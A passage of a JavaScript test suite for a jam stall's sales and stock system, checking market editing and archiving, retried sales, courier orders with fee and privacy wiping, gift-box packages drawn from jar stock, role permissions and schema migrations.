  assert.strictEqual(ps.filter((p) => p.name === 'Apricot').length, 3);
  const keep = ps.find((p) => p.id === 'P50');
  assert.strictEqual(keep.price, 72, 'her price is untouched'); assert.strictEqual(keep.onHand, 2, 'her stock is untouched');
  assert.strictEqual(ps.find((p) => p.id === 'P51').active, false, 'a size she switched off stays off');
  assert.strictEqual(ps.filter((p) => p.name === 'Mulberry').length, 3, 'and is not added a second time');
  const added = ps.find((p) => p.name === 'Apricot' && p.variant === '250 ml');
  assert.strictEqual(added.onHand, 0); assert.strictEqual(added.price, 50); assert.strictEqual(added.active, true);
  assert.strictEqual(SF.dispatch('stock', { token: tok }).data.sizesMissing, 0);
  const again = SF.dispatch('addJamSizes', { token: tok, opId: 'ads2' });
  assert.strictEqual(again.added, 0, 'running it again adds nothing');
  // cooking offers all three sizes, ready to fill in
  const pot = SF.dispatch('stock', { token: tok }).data.pots.find((x) => x.name === 'Apricot');
  assert.strictEqual(pot.sizes.length, 3);
});

test('only someone who may change stock can add the sizes', () => {
  const { SF } = jamStall();
  SF.setPin('viewer', '2222');
  const v = SF.dispatch('signIn', { pin: '2222', device: 'v' }).data.token;
  assert.strictEqual(SF.dispatch('addJamSizes', { token: v, opId: 'x' }).code, 'forbidden');
});

/* ---------- updates must never cost a sale ---------- */
test('a server too busy to take a sale says "send it again" (retry), and does nothing', () => {
  const env = shop(day(3));
  const { SF } = env;
  const tok = ownerTok(SF);
  env.ctx.__busy = true;
  const r = SF.dispatch('sell', { token: tok, opId: 'busy1', marketId: 'M01', lines: [{ id: 'P01', qty: 1 }] });
  assert.strictEqual(r.ok, false); assert.strictEqual(r.retry, true);
  assert.strictEqual(SF.orders().length, 0, 'nothing was sold');
  env.ctx.__busy = false;
  const again = SF.dispatch('sell', { token: tok, opId: 'busy1', marketId: 'M01', lines: [{ id: 'P01', qty: 1 }] });
  assert.strictEqual(again.ok, true);
  assert.strictEqual(SF.orders().length, 1, 'sent again, sold once');
});

test('the same sale sent twice (the first reply was lost) is sold once', () => {
  const { SF } = shop(day(3));
  const tok = ownerTok(SF);
  const sale = () => SF.dispatch('sell', { token: tok, opId: 'same1', marketId: 'M01', paid: 'card', lines: [{ id: 'P01', qty: 2 }] });
  const a = sale(), b = sale();
  assert.strictEqual(a.ok, true); assert.strictEqual(b.ok, true); assert.strictEqual(b.replayed, true);
  assert.strictEqual(SF.orders().length, 1);
  assert.strictEqual(SF.onHand().P01, 8, 'the stock went down once');
});

/* ---------- editing, archiving and deleting markets ---------- */
test('schema 11 adds the Orders and Archived headings to Markets', () => {
  const { SF, sheets } = shop(day(3));
  sheets.Markets.rows[0].length = 6;                 // a Markets tab from before
  SF.set('schemaVersion', 10);
  const done = SF.migrate();
  assert.ok(done.some((d) => /^11:/.test(d)), done.join(' | '));
  assert.strictEqual(JSON.stringify(sheets.Markets.rows[0].slice(6, 8)), JSON.stringify(['Orders', 'Archived']));
  assert.ok(SF.SCHEMA >= 11);
  assert.strictEqual(SF.markets()[0].orders, true, 'blank means pre-orders on');
});

test('a market can be renamed, moved and re-dated; bad dates and names are refused', () => {
  const { SF } = shop(day(3));
  const tok = ownerTok(SF);
  const r = SF.dispatch('editMarket', { token: tok, opId: 'e1', id: 'M01', name: 'Irene Village', date: day(5), location: 'Irene' });
  assert.strictEqual(r.ok, true);
  const m = SF.markets()[0];
  assert.strictEqual([m.id, m.name, m.date, m.location].join('|'), ['M01', 'Irene Village', day(5), 'Irene'].join('|'));
  assert.strictEqual(SF.dispatch('editMarket', { token: tok, opId: 'e2', id: 'M01', name: 'X', date: '' }).ok, false);
  assert.strictEqual(SF.dispatch('editMarket', { token: tok, opId: 'e3', id: 'M01', name: 'Fine', date: 'next week' }).ok, false);
  assert.strictEqual(SF.dispatch('editMarket', { token: tok, opId: 'e4', id: 'M99', name: 'Nope' }).ok, false);
});

test('pre-orders can be switched off for one market while the others keep taking orders', () => {
  const { SF } = shop(day(3));
  SF.append('markets', { MarketId: 'M02', Name: 'Other', Date: day(4), Status: 'planned' });
  const tok = ownerTok(SF);
  assert.strictEqual(SF.dispatch('setMarketOrders', { token: tok, opId: 'p1', id: 'M01', open: false }).ok, true);
  assert.strictEqual(order(SF).ok, false, 'the live market turns orders away');
  assert.strictEqual(order(SF, { market: 'M02' }).ok, true, 'the other market still takes them');
  const cat = SF.dispatch('catalogue', {}).data;
  assert.strictEqual(cat.open, false);
  assert.ok(cat.markets.some((m) => m.id === 'M02') && !cat.markets.some((m) => m.id === 'M01'));
  const hist = SF.dispatch('dashboard', { token: tok }).data.history.find((h) => h.id === 'M01');
  assert.strictEqual(hist.orders, false, 'the card can say so');
  SF.dispatch('setMarketOrders', { token: tok, opId: 'p2', id: 'M01', open: true });
  assert.strictEqual(order(SF).ok, true);
});

test('an archived market keeps its numbers but leaves the till, the order pages and the lists', () => {
  const { SF } = shop(day(3));
  SF.append('markets', { MarketId: 'M02', Name: 'Old one', Date: day(3), Status: 'planned' });
  const tok = ownerTok(SF);
  SF.dispatch('sell', { token: tok, opId: 's1', marketId: 'M02', lines: [{ id: 'P01', qty: 1 }] });
  assert.strictEqual(SF.dispatch('archiveMarket', { token: tok, opId: 'a1', id: 'M02' }).ok, true);
  const till = SF.dispatch('till', { token: tok }).data;
  assert.ok(!till.markets.some((m) => m.id === 'M02'), 'not on the till selector');
  assert.ok(!till.allMarkets.some((m) => m.id === 'M02'));
  assert.ok(!SF.dispatch('catalogue', {}).data.markets.some((m) => m.id === 'M02'), 'no order page');
  assert.strictEqual(order(SF, { market: 'M02' }).ok, false);
  const h = SF.dispatch('dashboard', { token: tok }).data.history.find((x) => x.id === 'M02');
  assert.strictEqual(h.archived, true);
  assert.strictEqual(h.revenue, 70, 'its sales stay in the numbers');
  assert.strictEqual(h.canDelete, false, 'it has a sale, so it can only be archived');
  assert.strictEqual(SF.dispatch('archiveMarket', { token: tok, opId: 'a2', id: 'M02', archived: false }).ok, true);
  assert.ok(SF.dispatch('till', { token: tok }).data.markets.some((m) => m.id === 'M02'), 'and it can come back');
});

test('the live market, or one with unpaid reservations, is not archived or deleted', () => {
  const { SF } = shop(day(3));
  SF.append('markets', { MarketId: 'M02', Name: 'Next', Date: day(4), Status: 'planned' });
  const tok = ownerTok(SF);
  assert.strictEqual(SF.dispatch('archiveMarket', { token: tok, opId: 'l1', id: 'M01' }).code, 'live');
  assert.strictEqual(SF.dispatch('deleteMarket', { token: tok, opId: 'l2', id: 'M01' }).code, 'live');
  order(SF, { market: 'M02' });
  assert.strictEqual(SF.dispatch('archiveMarket', { token: tok, opId: 'u1', id: 'M02' }).code, 'unpaid');
  assert.strictEqual(SF.dispatch('deleteMarket', { token: tok, opId: 'u2', id: 'M02' }).code, 'unpaid');
  const h = SF.dispatch('dashboard', { token: tok }).data.history.find((x) => x.id === 'M02');
  assert.strictEqual(h.unpaid, 1); assert.strictEqual(h.unpaidTotal, 70);
  // Release that market's reservations (not the live one's): then it can be archived.
  assert.strictEqual(SF.dispatch('releaseUnpaid', { token: tok, opId: 'rel', marketId: 'M02' }).released, 1);
  assert.strictEqual(SF.onHand().P01, 10, 'the stock is back');
  assert.strictEqual(SF.dispatch('archiveMarket', { token: tok, opId: 'u3', id: 'M02' }).ok, true);
});

test('a market with nothing against it is deleted, and its id is never given out again', () => {
  const { SF } = shop(day(3));
  SF.append('markets', { MarketId: 'M02', Name: 'Caroline test', Date: '2027-11-01', Status: 'planned' });
  const tok = ownerTok(SF);
  const r = SF.dispatch('deleteMarket', { token: tok, opId: 'd1', id: 'M02' });
  assert.strictEqual(r.ok, true);
  assert.ok(!SF.markets().some((m) => m.id === 'M02'), 'gone from every list');
  assert.ok(!SF.dispatch('dashboard', { token: tok }).data.history.some((h) => h.id === 'M02'));
  assert.strictEqual(SF.dispatch('deleteMarket', { token: tok, opId: 'd2', id: 'M02' }).ok, true, 'deleting it again is fine');
  const added = SF.dispatch('addMarket', { token: tok, opId: 'n1', name: 'Brand new' });
  assert.ok(added.ok); assert.notStrictEqual(added.id, 'M02', 'the deleted id is not reused');
  assert.strictEqual(SF.dispatch('editMarket', { token: tok, opId: 'd3', id: 'M02', name: 'Back?' }).ok, false);
});

test('a market with a sale, a cost or a stock move cannot be deleted', () => {
  const { SF } = shop(day(3));
  ['M02', 'M03', 'M04'].forEach((id) => SF.append('markets', { MarketId: id, Name: id, Date: day(4), Status: 'planned' }));
  const tok = ownerTok(SF);
  SF.dispatch('sell', { token: tok, opId: 's', marketId: 'M02', lines: [{ id: 'P01', qty: 1 }] });
  SF.dispatch('addExpense', { token: tok, opId: 'x', marketId: 'M03', description: 'Stall fee', amount: 100 });
  SF.move('P01', 1, 'adjust', 'test', 'M04');
  ['M02', 'M03', 'M04'].forEach((id) =>
    assert.strictEqual(SF.dispatch('deleteMarket', { token: tok, opId: 'del' + id, id }).code, 'used', id));
  assert.strictEqual(SF.markets().filter((m) => /^M0[234]$/.test(m.id)).length, 3);
});

test('only owners and managers change markets', () => {
  const { SF } = shop(day(3));
  SF.setPin('cashier', '1111');
  const c = SF.dispatch('signIn', { pin: '1111', device: 'd' }).data.token;
  [['editMarket', { id: 'M01', name: 'Hack' }], ['archiveMarket', { id: 'M01' }], ['deleteMarket', { id: 'M01' }],
   ['setMarketOrders', { id: 'M01', open: false }]].forEach(([a, p]) =>
    assert.strictEqual(SF.dispatch(a, Object.assign({ token: c, opId: a }, p)).ok, false, a));
});


/* ---------- Courier to you ---------- */
function courierShop(on) {
  const env = shop(day(3));
  const { SF } = env;
  SF.append('products', { ProductId: 'P02', Name: 'Fig Jam', Type: 'stocked', Unit: 'each', Price: 80, Active: 'Yes', Sort: 20 });
  SF.move('P02', 10, 'adjust', 'test');
  SF.set('homeOrders', 'yes');
  if (on !== false) {
    const tok = ownerTok(SF);
    const r = SF.dispatch('saveCourier', { token: tok, opId: 'cs' + (op++), on: true, name: 'The Courier Guy',
      lockerFee: 60, addressFee: 95, minJars: 3,
      eft: { bank: 'FNB', holder: 'Duxies', account: '62000000000', branch: '250655', type: 'Cheque' } });
    assert.strictEqual(r.ok, true, r.message);
    env.tok = tok;
  }
  return env;
}
const courierOrder = (SF, extra) => SF.dispatch('placeOrder', Object.assign({
  opId: 'c' + (op++), name: 'Anna', phone: '082 123 4567', consent: true, market: 'home',
  lines: [{ id: 'P01', qty: 2 }, { id: 'P02', qty: 1 }],
  delivery: { mode: 'locker', where: 'Pudo locker, Centurion Mall' } }, extra || {}));

test('the order page offers courier only between markets, and never shows bank details', () => {
  const { SF } = courierShop();
  const home = SF.dispatch('catalogue', { market: 'home' }).data;
  assert.strictEqual(home.courier.minJars, 3);
  assert.strictEqual(JSON.stringify(home.courier.modes), JSON.stringify([{ id: 'locker', fee: 60 }, { id: 'address', fee: 95 }]));
  assert.strictEqual(SF.dispatch('catalogue', { market: 'M01' }).data.courier, null);
  assert.ok(!/62000000000|FNB/.test(JSON.stringify(home)), 'bank details are not in the public catalogue');
});

test('courier is off until switched on, and needs a fee and a bank account', () => {
  const { SF } = courierShop(false);
  assert.strictEqual(SF.dispatch('catalogue', { market: 'home' }).data.courier, null);
  assert.strictEqual(courierOrder(SF).ok, false);
  const tok = ownerTok(SF);
  assert.strictEqual(SF.dispatch('saveCourier', { token: tok, opId: 'x1', on: true }).ok, false, 'no fee');
  assert.strictEqual(SF.dispatch('saveCourier', { token: tok, opId: 'x2', on: true, lockerFee: 60 }).ok, false, 'no bank account');
  assert.strictEqual(SF.dispatch('saveCourier', { token: tok, opId: 'x3', on: true, lockerFee: 'lots', eft: { account: '1' } }).ok, false);
  assert.strictEqual(SF.dispatch('saveCourier', { token: tok, opId: 'x4', on: true, lockerFee: '0', minJars: '', eft: { account: '1' } }).ok, true, 'a blank starting number keeps 3; a fee of 0 is allowed');
  assert.strictEqual(SF.courier().minJars, 3);
});

test('a courier order adds the fee on top, shows the EFT details, and leaves the goods total alone', () => {
  const { SF, sheets } = courierShop();
  const r = courierOrder(SF);
  assert.strictEqual(r.ok, true, r.message);
  assert.strictEqual(r.total, 220);                    // 2 x 70 + 80: goods only
  assert.strictEqual(r.toPay, 280);                    // plus the locker fee
  assert.strictEqual(r.delivery.fee, 60);
  assert.strictEqual(r.eft.account, '62000000000');
  assert.strictEqual(SF.onHand().P01, 8);              // stock is reserved straight away
  assert.strictEqual(SF.orders()[0].total, 220, 'the fee is not takings');
  const a = courierOrder(SF, { phone: '083 000 0001', delivery: { mode: 'address', where: '12 Rose St, Irene' } });
  assert.strictEqual(a.toPay, 315);
});

test('courier is refused for fewer than 3 jars, a missing place, a bad mode and a market day', () => {
  const { SF } = courierShop();
  assert.strictEqual(courierOrder(SF, { lines: [{ id: 'P01', qty: 2 }] }).ok, false);
  assert.strictEqual(courierOrder(SF, { delivery: { mode: 'locker', where: '' } }).ok, false);
  assert.strictEqual(courierOrder(SF, { delivery: { mode: 'drone', where: 'My roof, Pretoria' } }).ok, false);
  assert.strictEqual(courierOrder(SF, { market: 'M01' }).ok, false, 'courier is only between markets');
  assert.strictEqual(SF.onHand().P01, 10, 'a refused order reserves nothing');
  assert.strictEqual(courierOrder(SF, { lines: [{ id: 'P01', qty: 3 }] }).ok, true);
});

test('3 or more of one jar qualifies, weighed goods do not count towards the 3', () => {
  const { SF } = courierShop();
  SF.append('products', { ProductId: 'P03', Name: 'Rusks', Type: 'weighed', Unit: 'kg', Price: 100, Active: 'Yes', Sort: 30 });
  SF.move('P03', 10, 'adjust', 'test');
  assert.strictEqual(courierOrder(SF, { lines: [{ id: 'P01', qty: 2 }, { id: 'P03', qty: 5 }] }).ok, false);
});

test('a package qualifies for courier whatever the jar count', () => {
  const { SF } = courierShop();
  SF.append('products', { ProductId: 'K01', Name: 'Gift box', Type: 'package', Unit: 'each', Price: 250, Active: 'Yes', Sort: 40 });
  assert.strictEqual(SF.courierEligible([{ id: 'K01', qty: 1 }], SF.products({ all: true })), true);
});

test('a courier order is paid by EFT, stays paid until sent, and is wiped the moment it is sent', () => {
  const { SF, sheets, tok } = courierShop();
  const r = courierOrder(SF);
  const q0 = SF.dispatch('queue', { token: tok, marketId: 'home' }).data;
  assert.strictEqual(q0.unpaid.length, 0, 'not in the stall queue');
  assert.strictEqual(q0.courier.unpaid.length, 1);
  assert.strictEqual(q0.courier.unpaid[0].toPay, 280);
  assert.strictEqual(SF.dispatch('markSent', { token: tok, opId: 'm1', orderNo: r.orderNo }).ok, false, 'not before payment');
  assert.strictEqual(SF.dispatch('markCollected', { token: tok, opId: 'm2', orderNo: r.orderNo }).ok, false);
  assert.strictEqual(SF.dispatch('markPaid', { token: tok, opId: 'm3', orderNo: r.orderNo, paid: 'cash' }).ok, true);
  const o = SF.orders()[0];
  assert.strictEqual(o.status, 'paid', 'paying does not hand a courier order over');
  assert.strictEqual(o.paid, 'eft');
  assert.strictEqual(SF.dispatch('queue', { token: tok, marketId: 'M01' }).data.courier.toSend.length, 1, 'listed at any market');
  assert.strictEqual(o.delivery.where, 'Pudo locker, Centurion Mall');
  assert.strictEqual(SF.dispatch('markSent', { token: tok, opId: 'm4', orderNo: r.orderNo }).ok, true);
  const sent = SF.orders()[0];
  assert.strictEqual(sent.status, 'collected');
  assert.strictEqual(sent.customer + '|' + sent.phone + '|' + sent.delivery.where, 'Customer||');
  assert.strictEqual(sent.delivery.fee, 60, 'the fee is kept for the books');
  assert.ok(!/Centurion Mall|082 123 4567|Anna/.test(JSON.stringify(sheets.Orders.rows.slice(1)) + JSON.stringify(sheets.Audit.rows)),
    'nothing about the customer is left in the sheet or the audit trail');
});

test('a cancelled courier order puts the stock back and wipes where it was going', () => {
  const { SF, tok } = courierShop();
  const r = courierOrder(SF);
  assert.strictEqual(SF.onHand().P01, 8);
  assert.strictEqual(SF.dispatch('cancelOrder', { token: tok, opId: 'k1', orderNo: r.orderNo }).ok, true);
  assert.strictEqual(SF.onHand().P01, 10);
  assert.strictEqual(SF.orders()[0].delivery.where, '');
  assert.strictEqual(SF.orders()[0].customer, 'Customer');
});

test('the daily clean-up wipes a courier address that was never sent or cancelled by hand', () => {
  const { SF } = courierShop();
  const r = courierOrder(SF);
  SF.dispatch('releaseUnpaid', { token: ownerTok(SF), opId: 'ru', marketId: 'HOME' });
  assert.strictEqual(SF.orders()[0].status, 'cancelled');
  assert.strictEqual(SF.orders()[0].delivery.where, '');
  const again = courierOrder(SF, { phone: '083 000 0002' });
  SF.dispatch('cancelOrder', { token: ownerTok(SF), opId: 'cc', orderNo: again.orderNo });
  SF.purgeCustomers();
  assert.strictEqual(SF.orders().every((o) => !o.delivery.where), true);
});

test('only people allowed to settings change courier, and the bank details stay out of the audit', () => {
  const { SF, sheets } = courierShop();
  SF.setPin('cashier', '1111');
  const c = SF.dispatch('signIn', { pin: '1111', device: 'd' }).data.token;
  assert.strictEqual(SF.dispatch('saveCourier', { token: c, opId: 'z', on: false }).ok, false);
  assert.strictEqual(SF.dispatch('courierSettings', { token: c }).ok, false);
  assert.ok(!/62000000000/.test(JSON.stringify(sheets.Audit.rows)));
});

test('schema 12 adds the Delivery heading to Orders', () => {
  const { SF, sheets } = shop(day(3));
  SF.set('schemaVersion', 11);
  sheets.Orders.rows[0].length = 16;
  const done = SF.migrate();
  assert.ok(done.some((d) => /^12:/.test(d)), done.join(' | '));
  assert.strictEqual(sheets.Orders.rows[0][16], 'Delivery');
  assert.ok(SF.SCHEMA >= 12);
});

/* ---------- Packages (bundles) ---------- */
function packShop() {
  const env = courierShop(true);
  const { SF } = env;
  const jar = (id, name, variant, cat, n, price) => {
    SF.append('products', { ProductId: id, Name: name, Variant: variant, Type: 'stocked', Category: cat, Unit: 'each', Price: price, Active: 'Yes', Sort: 100 });
    if (n) SF.move(id, n, 'adjust', 'test');
  };
  jar('J1', 'Makataan', '125 ml', 'Jams', 3, 40);
  jar('J2', 'Guavadilla', '125 ml', 'Jams', 5, 40);
  jar('J3', 'Peachdilla', '125 ml', 'Jams', 2, 40);
  jar('J4', 'Fig', '125 ml', 'Jams', 4, 50);
  jar('J5', 'Orange Marmalade', '352 ml', 'Marmalades', 6, 70);
  jar('J6', 'Strawberry', '352 ml', 'Jams', 6, 70);
  jar('J7', 'Tomato Chilli', '352 ml', 'Chutney-style jams', 0, 70);
  SF.append('products', { ProductId: 'B1', Name: 'Butter Biscuits', Variant: '300 g pack', Type: 'made', Category: 'Biscuits', Unit: 'each', Price: 70, Capacity: 0, Active: 'Yes', Sort: 200 });
  const pack = (id, name, price, slots) => SF.append('products', { ProductId: id, Name: name, Type: 'package', Category: 'Gift boxes', Unit: 'each', Price: price, Active: 'Yes', Sort: 5000, Contents: JSON.stringify(slots) });
  pack('K1', 'Taste of Mzansi', 135, [{ id: 'J1', qty: 1 }, { id: 'J2', qty: 1 }, { id: 'J3', qty: 1 }]);
  pack('K2', "Teacher's Thank You", 85, [{ pick: 2, size: '125 ml' }]);
  pack('K3', 'Sunday Breakfast', 230, [{ pick: 1, size: '352 ml', cats: ['Marmalades'] }, { pick: 1, size: '352 ml', cats: ['Jams'] }, { id: 'B1', qty: 1 }]);
  pack('K4', 'Braai Box', 220, [{ id: 'J7', qty: 1 }, { id: 'J6', qty: 1 }]);
  return env;
}
const stockOf = (SF, id) => SF.onHand()[id] || 0;
const pk = (SF, id) => SF.products({ all: true }).find((p) => p.id === id);
const sellPack = (SF, tok, lines, extra) => SF.dispatch('sell', Object.assign({ token: tok, opId: 'pk' + (op++), lines, marketId: 'M01', paid: 'cash' }, extra || {}));

test('a package can be sold as often as its scarcest jar allows, and shows sold out when a jar is at 0', () => {
  const { SF } = packShop();
  assert.strictEqual(pk(SF, 'K1').available, 2, 'lowest of 3, 5 and 2');
  assert.strictEqual(pk(SF, 'K4').available, 0, 'Tomato Chilli is at 0');
  assert.strictEqual(pk(SF, 'K2').available, 7, 'two 125 ml jars each: 14 jars (3+5+2+4) over 2');
  assert.strictEqual(pk(SF, 'K1').onHand, 0, 'a package keeps no stock of its own');
  const r = order(SF, { market: 'home', lines: [{ id: 'K4', qty: 1 }] });
  assert.strictEqual(r.ok, false);
  assert.ok(/Tomato Chilli/.test(r.message), r.message);
});

test('selling a package takes each jar off through the ledger, at the package price, and nothing for the box itself', () => {
  const { SF, sheets, tok } = packShop();
  const before = SF.rows('movements').length;
  const r = sellPack(SF, tok, [{ id: 'K1', qty: 2 }]);
  assert.strictEqual(r.ok, true, r.message);
  assert.strictEqual(r.data ? 0 : 0, 0);
  assert.deepStrictEqual([stockOf(SF, 'J1'), stockOf(SF, 'J2'), stockOf(SF, 'J3')], [1, 3, 0]);
  const moves = SF.rows('movements').slice(before);
  assert.strictEqual(moves.length, 3);
  assert.ok(moves.every((m) => m.Type === 'sale' && m.ProductId !== 'K1'));
  const o = SF.orders().pop();
  assert.strictEqual(o.total, 270);
  assert.strictEqual(o.lines[0].contents.length, 3);
  assert.strictEqual(pk(SF, 'K1').available, 0, 'sold out now');
  assert.strictEqual(sellPack(SF, tok, [{ id: 'K1', qty: 1 }]).ok, false);
});

test('cancelling a package order puts the very same jars back', () => {
  const { SF, tok } = packShop();
  const r = order(SF, { market: 'home', lines: [{ id: 'K1', qty: 1 }] });
  assert.strictEqual(r.ok, true, r.message);
  assert.strictEqual(stockOf(SF, 'J3'), 1);
  assert.strictEqual(SF.dispatch('cancelOrder', { token: tok, opId: 'cx' + (op++), orderNo: r.orderNo }).ok, true);
  assert.deepStrictEqual([stockOf(SF, 'J1'), stockOf(SF, 'J2'), stockOf(SF, 'J3')], [3, 5, 2]);
});

test('a package with choices needs the right number of eligible jars, one box per line', () => {
  const { SF, tok } = packShop();
  const go = (extra) => sellPack(SF, tok, [Object.assign({ id: 'K2', qty: 1 }, extra)]);
  assert.strictEqual(go({}).ok, false, 'no jars chosen');
  assert.strictEqual(go({ picks: [['J1']] }).ok, false, 'one jar of two');
  assert.strictEqual(go({ picks: [['J1', 'J5']] }).ok, false, 'a 352 ml jar is not a 125 ml jar');
  assert.strictEqual(go({ picks: [['J1', 'NOPE']] }).ok, false);
  assert.strictEqual(sellPack(SF, tok, [{ id: 'K2', qty: 2, picks: [['J1', 'J2']] }]).ok, false, 'two boxes need two sets of picks');
  assert.strictEqual(stockOf(SF, 'J1'), 3, 'nothing moved on a refusal');
  assert.strictEqual(go({ picks: [['J1', 'J2']] }).ok, true);
  assert.deepStrictEqual([stockOf(SF, 'J1'), stockOf(SF, 'J2')], [2, 4]);
  assert.strictEqual(go({ picks: [['J3', 'J3']] }).ok, true, 'the same flavour twice is allowed while there is stock');
  assert.strictEqual(stockOf(SF, 'J3'), 0);
  assert.strictEqual(go({ picks: [['J3', 'J1']] }).ok, false, 'Peachdilla is finished');
});

test('jars in two lines of one order are counted together', () => {
  const { SF } = packShop();
  // J3 has 2: a box takes 1 and a plain jar line asks for 2
  const r = order(SF, { market: 'home', lines: [{ id: 'K1', qty: 1 }, { id: 'J3', qty: 2 }] });
  assert.strictEqual(r.ok, false);
  assert.strictEqual(stockOf(SF, 'J3'), 2);
  assert.strictEqual(order(SF, { market: 'home', lines: [{ id: 'J3', qty: 1 }, { id: 'K1', qty: 1 }] }).ok, true);
  assert.strictEqual(stockOf(SF, 'J3'), 0);
});

test('a numbered box keeps the order of its jars, and biscuits in a box use capacity, not stock', () => {
  const { SF, tok } = packShop();
  SF.append('products', { ProductId: 'K5', Name: 'Twelve', Type: 'package', Unit: 'each', Price: 480, Active: 'Yes', Sort: 1,
    Contents: JSON.stringify([{ pick: 3, size: '125 ml', numbered: true }]) });
  assert.strictEqual(sellPack(SF, tok, [{ id: 'K5', qty: 1, picks: [['J4', 'J1', 'J4']] }]).ok, true);
  const o = SF.orders().pop();
  assert.deepStrictEqual(Array.from(o.lines[0].chosen), ['1. Fig 125 ml', '2. Makataan 125 ml', '3. Fig 125 ml']);
  assert.strictEqual(stockOf(SF, 'J4'), 2);
  const before = SF.rows('movements').length;
  const b = sellPack(SF, tok, [{ id: 'K3', qty: 1, picks: [['J5'], ['J6']] }]);
  assert.strictEqual(b.ok, true, b.message);
  assert.strictEqual(SF.rows('movements').length - before, 2, 'a marmalade and a jam, no movement for the biscuits');
  assert.strictEqual(sellPack(SF, tok, [{ id: 'K3', qty: 1, picks: [['J6'], ['J6']] }]).ok, false, 'a jam is not a marmalade');
  assert.strictEqual(SF.orders().pop().lines[0].contents.filter((c) => c.made).length, 1);
});

test('packages stay out of stock counts, stock value and stock changes, and cannot be made by hand', () => {
  const { SF, tok } = packShop();
  assert.ok(!SF.dispatch('countState', { token: tok }).data.products.some((p) => p.id === 'K1'));
  SF.dispatch('countStart', { token: tok, opId: 'cs' + (op++) });
  assert.strictEqual(JSON.parse(SF.rows('stockcounts')[0].Snapshot).K1, undefined);
  assert.strictEqual(SF.dispatch('adjustStock', { token: tok, opId: 'a' + (op++), productId: 'K1', qty: 5, reason: 'x' }).ok, false);
  assert.strictEqual(SF.dispatch('addBatch', { token: tok, opId: 'b' + (op++), productId: 'K1', made: 2, lines: [{ label: 'x', qty: 1, price: 10 }] }).ok, false);
  assert.strictEqual(SF.dispatch('saveProduct', { token: tok, opId: 'n' + (op++), name: 'New box', type: 'package', price: 100 }).ok, false);
  const edit = SF.dispatch('saveProduct', { token: tok, opId: 'e' + (op++), productId: 'K1', name: 'Taste of Mzansi', price: 140, type: 'stocked' });
  assert.strictEqual(edit.ok, true);
  assert.strictEqual(pk(SF, 'K1').type, 'package', 'type and contents survive an edit');
  assert.strictEqual(pk(SF, 'K1').price, 140);
  assert.strictEqual(pk(SF, 'K1').slots.length, 3);
});

test('the order page and till list packages with their choices, and a package is courier-eligible', () => {
  const { SF, tok } = packShop();
  const cat = SF.dispatch('catalogue', { market: 'home' }).data.products.find((p) => p.id === 'K2');
  assert.strictEqual(cat.type, 'package');
  assert.strictEqual(cat.slots[0].kind, 'pick');
  assert.ok(cat.slots[0].choices.every((c) => c.variant === '125 ml'));
  assert.ok(!('cost' in cat));
  const till = SF.dispatch('till', { token: tok, marketId: 'M01' }).data.products.find((p) => p.id === 'K1');
  assert.strictEqual(till.slots.length, 3);
  const r = SF.dispatch('placeOrder', { opId: 'pc' + (op++), name: 'Anna', phone: '082 123 4567', consent: true, market: 'home',
    lines: [{ id: 'K1', qty: 1 }], delivery: { mode: 'locker', where: 'Pudo locker, Centurion Mall' } });
  assert.strictEqual(r.ok, true, r.message);
  assert.strictEqual(r.toPay, 135 + 60);
});

test('the gift boxes fix finds jars by name and size, adds each box once, and leaves hand edits alone', () => {
  const env = shop(day(3));
  const { SF, ctx } = env;
  const st = vm.createContext(Object.assign({}, { SF, SpreadsheetApp: {} }));
  ['Costing.gs', 'Stocktake.gs'].forEach((f) => vm.runInContext(fs.readFileSync(path.join(__dirname, '..', 'stalls', 'duxies', f), 'utf8'), st));
  SF.pots = () => st.sfPots(); SF.newPot = (n) => st.sfNewPot(n);
  st.sfApplyStocktake();
  vm.runInContext(fs.readFileSync(path.join(__dirname, '..', 'stalls', 'duxies', 'Fixes.gs'), 'utf8'), ctx);
  assert.ok(SF.runDataFixes().some((w) => /gift boxes/.test(w)));
  const boxes = SF.products({ all: true }).filter((p) => p.type === 'package');
  assert.strictEqual(boxes.length, 8);
  const by = (n) => boxes.find((p) => p.name === n);
  assert.strictEqual(boxes.map((p) => p.price).sort((a, b) => a - b).join(','), '85,135,150,220,220,230,230,480');
  assert.strictEqual(by('Taste of Mzansi').available, 0, 'Makataan 125 ml is at 0');
  assert.strictEqual(by('Braai Box').available, 6, 'Tomato Chilli 9, Tomato Ginger 10 (352 ml), Strawberry Chilli 6');
  assert.strictEqual(by('Cheese Board Trio').available, 0, 'Fig Chunky 352 ml is at 0');
  assert.strictEqual(by('Grown-ups Only').available, 1, 'Strawberry Gin 352 ml: 1');
  assert.ok(by('Sunday Breakfast').available > 0);
  assert.ok(by('12 Jars of Christmas').available >= 1);
  const ids = SF.rows('products').map((r) => r.ProductId);
  assert.strictEqual(new Set(ids).size, ids.length, 'no id is reused');
  // a hand edit wins; a second run adds nothing
  SF.setCell('products', by('Braai Box').row, 'Price', 240);
  SF.setCell('products', by('Jam Club (monthly)').row, 'Active', 'No');
  assert.strictEqual(SF.runDataFixes().length, 0);
  assert.strictEqual(SF.products({ all: true }).filter((p) => p.type === 'package').length, 8);
  assert.strictEqual(SF.products({ all: true }).find((p) => p.name === 'Braai Box').price, 240);
  // the stocktake leaves the boxes alone and the stock total is unchanged
  const boxIds = boxes.map((p) => p.id);
  st.sfApplyStocktake();
  assert.strictEqual(SF.rows('movements').filter((m) => boxIds.indexOf(String(m.ProductId)) !== -1).length, 0, 'no stock was ever written for a box');
  assert.strictEqual(new Set(SF.rows('products').map((r) => r.ProductId)).size, SF.rows('products').length);
});

test('schema 13 adds the Contents heading to Products', () => {
  const { SF, sheets } = shop(day(3));
  SF.set('schemaVersion', 12);
  sheets.Products.rows[0].length = 11;
  const done = SF.migrate();
  assert.ok(done.some((d) => /^13:/.test(d)), done.join(' | '));
  assert.strictEqual(sheets.Products.rows[0][11], 'Contents');
  assert.strictEqual(SF.SCHEMA, 13);
});

console.log(failures ? '\n' + failures + ' failed' : '\nall passed');
process.exit(failures ? 1 : 0);
